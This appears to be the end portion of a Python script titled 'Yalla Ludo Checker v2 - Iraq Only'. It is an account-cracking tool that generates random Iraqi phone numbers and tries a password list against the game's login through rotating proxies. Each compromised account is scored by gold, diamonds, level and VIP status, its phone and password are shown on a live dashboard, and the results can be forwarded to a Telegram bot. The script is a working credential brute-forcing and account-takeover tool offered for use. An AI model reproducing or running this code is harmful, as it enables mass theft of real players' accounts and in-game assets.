                            console.print(f"    VIP: [green]{vip_text}[/green]")
                        else:
                            console.print(f"    VIP: [red]No[/red]")
                        console.print(f"    [dim]Saved to {saved_file}[/dim]")
                    else:
                        print(f"\n[+] GOOD: {mobile} | {pwd}")
                        print(f"    Name: {name}")
                        print(f"    ID: {uid}")
                        print(f"    Gold: {gold:,}")
                        print(f"    Diamond: {diamond:,}")
                        print(f"    Level: {level}")
                        if is_vip:
                            vip_text = f"Yes"
                            if vip_type:
                                vip_text += f" ({vip_type})"
                            print(f"    VIP: {vip_text}")
                        else:
                            print(f"    VIP: No")
                        print(f"    Saved to {saved_file}")
                    
                    if TELEGRAM_ENABLED:
                        await send_telegram(session, account_data)
                    
                    return
                    
                else:
                    status = result.get("status", -1)
                    tips = result.get("tips", "")
                    
                    if status == 151 or ("كلمة السر" in str(tips) and "خاطئة" in str(tips)):
                        continue
                    else:
                        with stats_lock:
                            stats['not_registered'] += 1
                            stats['total'] += 1
                        return
                        
            except asyncio.TimeoutError:
                with stats_lock:
                    stats['error'] += 1
                    stats['total'] += 1
                continue
            except Exception as e:
                with stats_lock:
                    stats['error'] += 1
                    stats['total'] += 1
                if proxy:
                    continue
        
        with stats_lock:
            stats['wrong_pass'] += 1
            stats['total'] += 1

# ==================== داشبورد ====================
def create_dashboard():
    elapsed = int(time.time() - start_time)
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60
    
    with stats_lock:
        total = stats['total']
        good = stats['good']
        wrong = stats['wrong_pass']
        notreg = stats['not_registered']
        errors = stats['error']
        verification = stats['verification_needed']
        vip_count = vip_stats.get('VIP', 0)
        non_vip_count = vip_stats.get('Non-VIP', 0)
    
    if RICH_AVAILABLE:
        stats_table = Table(show_header=False, box=box.ROUNDED, border_style="bright_blue")
        stats_table.add_column("", style="cyan", width=15)
        stats_table.add_column("", style="green", justify="right")
        
        stats_table.add_row("Elapsed", f"{hours:02d}:{minutes:02d}:{seconds:02d}")
        stats_table.add_row("Checked", f"[green]{total}[/green]")
        stats_table.add_row("Hits", f"[green]{good}[/green]")
        stats_table.add_row("Bads", f"[green]{wrong + notreg}[/green]")
        stats_table.add_row("Verify", f"[yellow]{verification}[/yellow]")
        stats_table.add_row("Errors", f"[green]{errors}[/green]")
        stats_table.add_row("VIP", f"[magenta]{vip_count}[/magenta]")
        stats_table.add_row("Non-VIP", f"[white]{non_vip_count}[/white]")
        
        gold_table = Table(show_header=False, box=box.MINIMAL)
        gold_table.add_column("", style="yellow")
        gold_table.add_column("", style="green", justify="right")
        gold_table.add_row("0-999K", str(gold_stats.get('0-999K', 0)))
        gold_table.add_row("1M-4.9M", str(gold_stats.get('1M-4.9M', 0)))
        gold_table.add_row("5M-9.9M", str(gold_stats.get('5M-9.9M', 0)))
        gold_table.add_row("10M-49M", str(gold_stats.get('10M-49M', 0)))
        gold_table.add_row("50M-99M", str(gold_stats.get('50M-99M', 0)))
        gold_table.add_row("100M+", str(gold_stats.get('100M+', 0)))
        
        diamond_table = Table(show_header=False, box=box.MINIMAL)
        diamond_table.add_column("", style="cyan")
        diamond_table.add_column("", style="green", justify="right")
        diamond_table.add_row("0-9.9K", str(diamond_stats.get('0-9.9K', 0)))
        diamond_table.add_row("10K-49K", str(diamond_stats.get('10K-49K', 0)))
        diamond_table.add_row("50K-99K", str(diamond_stats.get('50K-99K', 0)))
        diamond_table.add_row("100K-499K", str(diamond_stats.get('100K-499K', 0)))
        diamond_table.add_row("500K-999K", str(diamond_stats.get('500K-999K', 0)))
        diamond_table.add_row("1M+", str(diamond_stats.get('1M+', 0)))
        
        level_table = Table(show_header=False, box=box.MINIMAL)
        level_table.add_column("", style="magenta")
        level_table.add_column("", style="green", justify="right")
        level_table.add_row("Level 0-9", str(level_stats.get('Level 0-9', 0)))
        level_table.add_row("Level 10-19", str(level_stats.get('Level 10-19', 0)))
        level_table.add_row("Level 20-29", str(level_stats.get('Level 20-29', 0)))
        level_table.add_row("Level 30-39", str(level_stats.get('Level 30-39', 0)))
        level_table.add_row("Level 40+", str(level_stats.get('Level 40+', 0)))
        
        last_found_text = ""
        for acc in found_accounts[-5:]:
            vip_status = "✅VIP" if acc['is_vip'] else "❌"
            last_found_text += f"  [green]{acc['phone']}[/green] | Pass: [yellow]{acc['password']}[/yellow] | Gold:[green]{acc['gold']:,}[/green] | Diamond:[green]{acc['diamond']:,}[/green] | Lv:[green]{acc['level']}[/green] | VIP:{vip_status}\n"
        if not last_found_text:
            last_found_text = "  No accounts found yet..."
        
        layout = Layout()
        layout.split_column(
            Layout(Panel(Text("YALLA LUDO CHECKER v2 - Iraq Only", style="bold bright_blue"), box=box.HEAVY)),
            Layout(Panel(stats_table, title="[bold]Statistics", border_style="blue")),
            Layout(name="middle"),
            Layout(Panel(last_found_text, title="[bold green]Last Found Accounts", border_style="green")),
            Layout(Panel(f"By @to_ls | Proxies: [green]{len(proxy_manager.proxies) if proxy_manager else 0}[/green] (Working: [green]{len(proxy_manager.working_proxies) if proxy_manager else 0}[/green]) | Telegram: [green]ON[/green]" if TELEGRAM_ENABLED else "Telegram: [red]OFF[/red]", style="dim"))
        )
        
        layout["middle"].split_row(
            Layout(Panel(gold_table, title="[bold yellow]Gold Categories", border_style="yellow")),
            Layout(Panel(diamond_table, title="[bold cyan]Diamond Categories", border_style="cyan")),
            Layout(Panel(level_table, title="[bold magenta]Level Categories", border_style="magenta"))
        )
        
        return layout
    else:
        output = f"""
╔══════════════════════════════════════════════════════════════╗
║              YALLA LUDO CHECKER v2                         ║
║              Iraq Only - 77xxxxxxxx                        ║
║              By @to_ls                                     ║
╚══════════════════════════════════════════════════════════════╝

  ⏱️  Time     : {hours:02d}:{minutes:02d}:{seconds:02d}
  📊 Checked   : {total}
  
  ✅ Hits      : {good}
  ❌ Wrong Pass: {wrong}
  📝 Not Reg   : {notreg}
  🔍 Verify    : {verification}
  ⚠️ Errors    : {errors}
  
  👑 VIP       : {vip_count}
  👤 Non-VIP   : {non_vip_count}

  ── GOLD CATEGORIES ──
    0-999K    : {gold_stats.get('0-999K', 0)}
    1M-4.9M   : {gold_stats.get('1M-4.9M', 0)}
    5M-9.9M   : {gold_stats.get('5M-9.9M', 0)}
    10M-49M   : {gold_stats.get('10M-49M', 0)}
    50M-99M   : {gold_stats.get('50M-99M', 0)}
    100M+     : {gold_stats.get('100M+', 0)}

  ── DIAMOND CATEGORIES ──
    0-9.9K    : {diamond_stats.get('0-9.9K', 0)}
    10K-49K   : {diamond_stats.get('10K-49K', 0)}
    50K-99K   : {diamond_stats.get('50K-99K', 0)}
    100K-499K : {diamond_stats.get('100K-499K', 0)}
    500K-999K : {diamond_stats.get('500K-999K', 0)}
    1M+       : {diamond_stats.get('1M+', 0)}

  ── LEVEL CATEGORIES ──
    Level 0-9   : {level_stats.get('Level 0-9', 0)}
    Level 10-19 : {level_stats.get('Level 10-19', 0)}
    Level 20-29 : {level_stats.get('Level 20-29', 0)}
    Level 30-39 : {level_stats.get('Level 30-39', 0)}
    Level 40+   : {level_stats.get('Level 40+', 0)}

  ── LAST FOUND ACCOUNTS ──
"""
        for acc in found_accounts[-5:]:
            vip_status = "VIP" if acc['is_vip'] else "Non-VIP"
            output += f"    {acc['phone']} | Pass: {acc['password']} | Gold:{acc['gold']} | Diamond:{acc['diamond']} | Lv:{acc['level']} | {vip_status}\n"
        if not found_accounts:
            output += "    No accounts found yet...\n"
        
        output += f"""
  By @to_ls | Proxies: {len(proxy_manager.proxies) if proxy_manager else 0} (Working: {len(proxy_manager.working_proxies) if proxy_manager else 0}) | Telegram: {'ON' if TELEGRAM_ENABLED else 'OFF'}
"""
        return output

def dashboard_loop():
    if RICH_AVAILABLE:
        with Live(create_dashboard(), refresh_per_second=1, screen=True) as live:
            while not stop_flag:
                live.update(create_dashboard())
                time.sleep(1)
    else:
        while not stop_flag:
            os.system('cls' if os.name == 'nt' else 'clear')
            print(create_dashboard())
            time.sleep(1)

# ==================== MAIN ====================
async def main_async():
    global stop_flag, proxy_manager, BOT_TOKEN, CHAT_IDS, TELEGRAM_ENABLED
    
    if RICH_AVAILABLE:
        console.print(Panel("Yalla Ludo Checker v2\nSingle Account & Random Mode + Telegram + Custom Passwords\nBy @to_ls", style="bold blue", box=box.HEAVY))
    else:
        print("""
╔══════════════════════════════════════════════════════════════╗
║              YALLA LUDO CHECKER v2                         ║
║    Single Account & Random Mode + Telegram + Custom Pass   ║
║              By @to_ls                                     ║
╚══════════════════════════════════════════════════════════════╝
        """)
    
    # ==================== إعدادات التليجرام ====================
    print("\n[+] Telegram Settings:")
    bot_token = input("Bot Token (press Enter to skip): ").strip()
    if bot_token:
        BOT_TOKEN = bot_token
        chat_ids_input = input("Chat IDs (comma separated, e.g., 123,456): ").strip()
        if chat_ids_input:
            CHAT_IDS = [x.strip() for x in chat_ids_input.split(',') if x.strip()]
            TELEGRAM_ENABLED = True
            if RICH_AVAILABLE:
                console.print(f"[green][✓][/green] Telegram enabled for {len(CHAT_IDS)} chat(s)")
            else:
                print(f"[✓] Telegram enabled for {len(CHAT_IDS)} chat(s)")
        else:
            if RICH_AVAILABLE:
                console.print("[yellow][!][/yellow] No chat IDs provided, Telegram disabled")
            else:
                print("[!] No chat IDs provided, Telegram disabled")
    else:
        if RICH_AVAILABLE:
            console.print("[yellow][!][/yellow] No bot token provided, Telegram disabled")
        else:
            print("[!] No bot token provided, Telegram disabled")
    
    print("\n[1] Single Account Check (فحص حساب واحد)")
    print("[2] Random Check (فحص عشوائي)")
    
    mode = input("\nSelect mode (1/2): ").strip()
    
    if mode == "1":
        # وضع فحص حساب واحد
        phone = input("Enter phone number (e.g., 7730170400): ").strip()
        password = input("Enter password: ").strip()
        
        if not phone or not password:
            print("[!] Phone and password required!")
            return
        
        proxy_path = input("Proxy file path (press Enter to skip): ").strip()
        if proxy_path:
            proxy_manager = ProxyManager(proxy_path)
        else:
            proxy_manager = ProxyManager()
        
        connector = aiohttp.TCPConnector(limit=10, limit_per_host=10)
        async with aiohttp.ClientSession(connector=connector) as session:
            await check_single_account(session, phone, password)
        
    else:
        # وضع فحص عشوائي
        proxy_path = input("Proxy file path (press Enter to skip): ").strip()
        if proxy_path:
            proxy_manager = ProxyManager(proxy_path)
        else:
            proxy_manager = ProxyManager()
            if RICH_AVAILABLE:
                console.print("[yellow][!][/yellow] Running without proxies")
            else:
                print("[!] Running without proxies")
        
        # ==================== اختيار الباسوردات ====================
        passwords_list = get_passwords_list()
        
        if RICH_AVAILABLE:
            console.print(f"[green][✓][/green] Using {len(passwords_list)} passwords")
            console.print(f"[dim]Passwords: {', '.join(passwords_list[:5])}{'...' if len(passwords_list) > 5 else ''}[/dim]")
        else:
            print(f"[✓] Using {len(passwords_list)} passwords")
            print(f"Passwords: {', '.join(passwords_list[:5])}{'...' if len(passwords_list) > 5 else ''}")
        
        print("\n[+] Starting random checker...\n")
        
        semaphore = asyncio.Semaphore(CONCURRENCY)
        
        threading.Thread(target=dashboard_loop, daemon=True).start()
        
        connector = aiohttp.TCPConnector(limit=CONCURRENCY*2, limit_per_host=CONCURRENCY, force_close=False)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            while not stop_flag:
                mobile = generate_mobile_iq()
                proxy = proxy_manager.get_proxy() if proxy_manager else None
                task = asyncio.create_task(check_random_async(session, mobile, semaphore, passwords_list, proxy))
                tasks.append(task)
                
                if len(tasks) > MAX_TASKS:
                    done, pending = await asyncio.wait(tasks[:MAX_TASKS//2], return_when=asyncio.FIRST_COMPLETED)
                    tasks = list(pending) + tasks[MAX_TASKS//2:]
            
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)

def run():
    asyncio.run(main_async())

if __name__ == "__main__":
    try:
        run()
    except KeyboardInterrupt:
        stop_flag = True
        if RICH_AVAILABLE:
            console.print("\n[yellow][!][/yellow] Stopped.")
            console.print("\n[bold green]Final Report:[/bold green]")
            elapsed = int(time.time() - start_time)
            hours = elapsed // 3600
            minutes = (elapsed % 3600) // 60
            seconds = elapsed % 60
            with stats_lock:
                console.print(f"  Time: [green]{hours:02d}:{minutes:02d}:{seconds:02d}[/green]")
                console.print(f"  Hits: [green]{stats['good']}[/green]")
                console.print(f"  Verify: [yellow]{stats['verification_needed']}[/yellow]")
                console.print(f"  VIP: [magenta]{vip_stats.get('VIP', 0)}[/magenta]")
                console.print(f"  Non-VIP: [white]{vip_stats.get('Non-VIP', 0)}[/white]")
                console.print("  Gold Categories:")
                for cat, count in sorted(gold_stats.items()):
                    console.print(f"    - {cat}: [green]{count}[/green]")
                console.print("  Diamond Categories:")
                for cat, count in sorted(diamond_stats.items()):
                    console.print(f"    - {cat}: [green]{count}[/green]")
                console.print("  Level Categories:")
                for cat, count in sorted(level_stats.items()):
                    console.print(f"    - {cat}: [green]{count}[/green]")
            console.print("\n[magenta]By @to_ls[/magenta]")
        else:
            print("\n[!] Stopped.")
            print("\n[+] Final Report:")
            elapsed = int(time.time() - start_time)
            hours = elapsed // 3600
            minutes = (elapsed % 3600) // 60
            seconds = elapsed % 60
            with stats_lock:
                print(f"    Time: {hours:02d}:{minutes:02d}:{seconds:02d}")
                print(f"    Hits: {stats['good']}")
                print(f"    Verify: {stats['verification_needed']}")
                print(f"    VIP: {vip_stats.get('VIP', 0)}")
                print(f"    Non-VIP: {vip_stats.get('Non-VIP', 0)}")
                print(f"    Gold Categories:")
                for cat, count in sorted(gold_stats.items()):
                    print(f"      - {cat}: {count}")
                print(f"    Diamond Categories:")
                for cat, count in sorted(diamond_stats.items()):
                    print(f"      - {cat}: {count}")
                print(f"    Level Categories:")
                for cat, count in sorted(level_stats.items()):
                    print(f"      - {cat}: {count}")
            print("\nBy @to_ls")
